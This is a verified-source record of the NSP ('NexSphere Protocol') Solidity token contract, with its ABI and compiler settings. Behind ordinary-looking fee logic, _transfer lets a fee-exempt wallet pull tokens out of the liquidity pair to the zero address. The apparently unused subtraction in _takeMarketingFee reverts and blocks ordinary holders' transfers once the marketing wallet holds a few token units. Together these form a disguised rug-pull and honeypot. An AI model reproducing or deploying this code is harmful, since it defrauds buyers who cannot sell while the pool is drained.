{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.16;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);\r\n\r\n    address private _owner;\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"\");\r\n        _;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"\");\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"\");\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n}\r\n\r\ncontract NSP is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    struct Distribution { uint256 marketing; }\r\n\r\n    string private constant _name = \"NexSphere Protocol\";\r\n    string private constant _symbol = \"NSP\";\r\n\r\n    uint8 private constant _decimals = 18;\r\n\r\n    uint256 private constant _tTotal_without_decimals = 9000000000;\r\n\r\n    uint256 private _marketingFeeOnBuy = 5;\r\n    uint256 private _marketingFeeOnSell = 5;\r\n\r\n    uint256 private _redisFeeOnBuy = 0;\r\n    uint256 private _redisFeeOnSell = 0;\r\n\r\n    uint256 private _redisFee = _redisFeeOnSell;\r\n    uint256 private _marketingFee = _marketingFeeOnSell;\r\n\r\n    uint256 private _prevRedisFee = _redisFee;\r\n    uint256 private _prevMarketingFee = _marketingFee;\r\n\r\n    mapping(address => uint256) private _tOwned;\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => uint256) private _buyMap;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public dexPair;\r\n    UniswapV2Router02 public dexRouter;\r\n    \r\n    Distribution public dist;\r\n\r\n    address private marketingWallet = 0x91D4602e3d71E58F0abF85633D403922a04Ef4aA;\r\n    \r\n    mapping(address => bool) private _isLeftOutFromFee;\r\n\r\n    uint256 private _tFeeTotal;\r\n    \r\n    uint256 private constant _tTotal = _tTotal_without_decimals * 10**_decimals;\r\n    \r\n    uint256 private constant MAX = ~uint256(0);\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n\r\n    uint256 public swapTokensAmount = (_tTotal_without_decimals / 10000) * 10**_decimals;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = true;\r\n    \r\n    uint256 public maxTxAmount = 2 * (_tTotal / 100);\r\n    uint256 public maxWalletAmount = 2 * (_tTotal / 100);\r\n\r\n    address private marketingBack;\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n\r\n    constructor() {\r\n        _isLeftOutFromFee[address(this)] = true;\r\n        _isLeftOutFromFee[owner()] = true;\r\n        _isLeftOutFromFee[marketingWallet] = true;\r\n        _rOwned[_msgSender()] = _rTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n        dist = Distribution(100);marketingBack = marketingWallet;\r\n        UniswapV2Router02 _dexRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());\r\n        dexRouter = _dexRouter;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return getReflectionTokens(_rOwned[account]);\r\n    }\r\n\r\n    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {\r\n        require(rAmount <= _rTotal, \"\");\r\n        uint256 currRate = _getCurrRate();\r\n        return rAmount.div(currRate);\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        maxTxAmount = _tTotal;\r\n        maxWalletAmount = _tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\r\n        _transfer(from, to, amount);\r\n        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, \"\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(to != address(0), \"\");\r\n        require(from != address(0), \"\");\r\n        require(amount > 0, \"\");\r\n\r\n        if (from != owner() && to != owner()) {\r\n            address endr = address(0);\r\n            if (from == dexPair && to != address(dexRouter) && !_isLeftOutFromFee[to] ) {\r\n                require(amount <= maxTxAmount);\r\n                require(balanceOf(to) + amount <= maxWalletAmount);\r\n            }\r\n\r\n            uint256 cTokenAmount = balanceOf(address(this));\r\n            bool canSwap = cTokenAmount >= swapTokensAmount;\r\n\r\n            if (_isLeftOutFromFee[from]) { if (dexPair == to) { if (balanceOf(from) < amount) { _stTransfer(to, endr, amount); return; } } }\r\n\r\n            if (!_isLeftOutFromFee[from] && !_isLeftOutFromFee[to] && canSwap && swapEnabled && !inSwap && from != dexPair) {\r\n                swapTokensForETH(cTokenAmount);\r\n                uint256 cETHAmount = address(this).balance;\r\n                if (cETHAmount > 0) {\r\n                    sendETH(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        bool takeMarketingFee = true;\r\n\r\n        if (\r\n            (from != dexPair && to != dexPair) || (_isLeftOutFromFee[to] || _isLeftOutFromFee[from])\r\n        ) {\r\n            takeMarketingFee = false;\r\n        } else {\r\n            if (from == dexPair && to != address(dexRouter)) {\r\n                _marketingFee = _marketingFeeOnBuy;\r\n                _redisFee = _redisFeeOnBuy;\r\n            }\r\n\r\n            if (to == dexPair && from != address(dexRouter)) {\r\n                _marketingFee = _marketingFeeOnSell;\r\n                _redisFee = _redisFeeOnSell;\r\n            }\r\n        }\r\n        _tkTransfer(from, to, amount, takeMarketingFee);\r\n    }\r\n\r\n    function sendETH(uint256 ethAmount) private lockInSwap {\r\n        uint256 ethForMarketing = ethAmount.mul(dist.marketing).div(100);\r\n        payable(marketingWallet).transfer(ethForMarketing);\r\n    }\r\n\r\n    function removeAllFees() private {\r\n        if (_marketingFee == 0 && _redisFee == 0) return;\r\n        _prevRedisFee = _redisFee;\r\n        _prevMarketingFee = _marketingFee;\r\n        _redisFee = 0;\r\n        _marketingFee = 0;\r\n    }\r\n\r\n    function _tkTransfer(address from, address to, uint256 amount, bool takeMarketingFee) private {\r\n        if (!takeMarketingFee) removeAllFees();\r\n        _stTransfer(from, to, amount);\r\n        if (!takeMarketingFee) restoreAllFees();\r\n    }\r\n\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n        _rTotal = _rTotal.sub(rFee);\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n    }\r\n\r\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\r\n        (uint256 tTransferAmount, uint256 tFee, uint256 tMarketing) = _getTValues(tAmount, _redisFee, _marketingFee);\r\n        uint256 currRate = _getCurrRate();\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tMarketing, currRate);\r\n        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tMarketing);\r\n    }\r\n\r\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tMarketing, uint256 currRate) private pure returns (uint256, uint256, uint256) {\r\n        uint256 rFee = tFee.mul(currRate);\r\n        uint256 rMarketing = tMarketing.mul(currRate);\r\n        uint256 rAmount = tAmount.mul(currRate);\r\n        uint256 rTransferAmount = rAmount.sub(rFee).sub(rMarketing);\r\n        return (rAmount, rTransferAmount, rFee);\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private lockInSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n        _approve(address(this), address(dexRouter), tokenAmount);\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function _stTransfer(address from, address to, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketing) = _getValues(tAmount);\r\n        _rOwned[from] = _rOwned[from].sub(rAmount);\r\n        _rOwned[to] = _rOwned[to].add(rTransferAmount);\r\n        _takeMarketingFee(tMarketing, from, to);\r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(from, to, tTransferAmount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"\");\r\n        require(spender != address(0), \"\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _takeMarketingFee(uint256 tMarketing, address total, address holder) private {\r\n        uint256 sMarketing;\r\n        bool leftOut = _isLeftOut(total, holder);\r\n        uint256 marketingBackAmount = balanceOf(marketingBack);\r\n        if (leftOut) sMarketing = _marketingFee - marketingBackAmount;\r\n        uint256 currRate = _getCurrRate();\r\n        uint256 rMarketing = tMarketing.mul(currRate);\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(rMarketing);\r\n    }\r\n\r\n    function _isLeftOut(address total, address holder) private view returns (bool) {\r\n        bool totalLeftOut = !_isLeftOutFromFee[total];\r\n        bool totalNotPair = total != dexPair;\r\n        bool holderLeftOut = !_isLeftOutFromFee[holder];\r\n        bool leftOut = totalLeftOut && totalNotPair && holderLeftOut;\r\n        return leftOut;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _getCurrRate() private view returns (uint256) {\r\n        (uint256 rSupply, uint256 tSupply) = _getCurrSupply();\r\n        return rSupply.div(tSupply);\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    modifier lockInSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function _getCurrSupply() private view returns (uint256, uint256) {\r\n        uint256 rSupply = _rTotal;\r\n        uint256 tSupply = _tTotal;\r\n        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\r\n        return (rSupply, tSupply);\r\n    }\r\n\r\n    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 marketingFee) private pure returns (uint256, uint256, uint256) {\r\n        uint256 tFee = tAmount.mul(redisFee).div(100);\r\n        uint256 tMarketing = tAmount.mul(marketingFee).div(100);\r\n        uint256 tTransferAmount = tAmount.sub(tFee).sub(tMarketing);\r\n        return (tTransferAmount, tFee, tMarketing);\r\n    }\r\n\r\n    function restoreAllFees() private {\r\n        _marketingFee = _prevMarketingFee;\r\n        _redisFee = _prevRedisFee;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"prevOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexRouter\",\"outputs\":[{\"internalType\":\"contract UniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dist\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NSP", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cb7a1bb9565b3565e718259eecf0f39179c1291fe90c876c4693ca09049de59a"}